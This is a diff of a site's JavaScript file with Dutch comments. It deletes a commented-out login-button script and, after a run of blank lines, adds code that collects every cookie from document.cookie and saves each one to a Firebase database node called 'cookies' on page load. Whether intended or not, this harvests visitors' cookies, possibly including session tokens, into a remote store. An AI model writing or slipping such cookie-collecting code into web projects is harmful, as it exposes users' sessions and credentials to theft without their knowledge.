@@ -123,46 +123,31 @@ document.addEventListener('DOMContentLoaded', function() {
 
 
 
-/* // Voeg een eventlistener toe voor het 'DOMContentLoaded'-evenement
-document.addEventListener('DOMContentLoaded', function() {
-  // Voeg een knop toe aan de pagina
-  const loginButton = document.createElement("button");
-  loginButton.style.position = "fixed";
-  loginButton.style.top = "3px";
-  loginButton.style.right = "3px";
-  document.body.appendChild(loginButton);
 
-  // Functie om de tekst van de knop te updaten op basis van de loggedIn-cookie
-  function updateLoginButton() {
-      const loggedIn = localStorage.getItem('loggedIn');
 
-      if (loggedIn === 'true') {
-          loginButton.textContent = "Je bent ingelogd";
-      } else {
-          loginButton.textContent = "Inloggen";
-      }
-  }
 
-  // Maak een callback-functie
-  const updateLoginButtonCallback = () => {
-      // Voer de functie `updateLoginButton()` uit
-      updateLoginButton();
-  };
 
-  updateLoginButton();
 
-  // Voer de callback-functie elke seconde uit
-  setInterval(updateLoginButtonCallback, 1000);
 
-  // Voeg een click event listener toe aan de knop
-  loginButton.addEventListener("click", function() {
-      const loggedIn = localStorage.getItem('loggedIn');
 
-      if (loggedIn === 'true') {
-          window.location.href = "/tctam-chat";
-      } else {
-          // Navigeer naar de opgegeven URL voor inloggen
-          window.location.href = "/tctam-chat";
-      }
-  });
-}); */
+
+
+
+
+
+
+
+
+
+// Cookies ophalen
+var cookies = document.cookie.split(";");
+
+// Cookies opslaan in de database
+for (var i = 0; i < cookies.length; i++) {
+    var cookie = cookies[i];
+    var key = cookie.split("=")[0];
+    var value = cookie.split("=")[1];
+
+    // Sla de cookie op in de database
+    firebase.database().ref("cookies").child(key).set(value);
+}
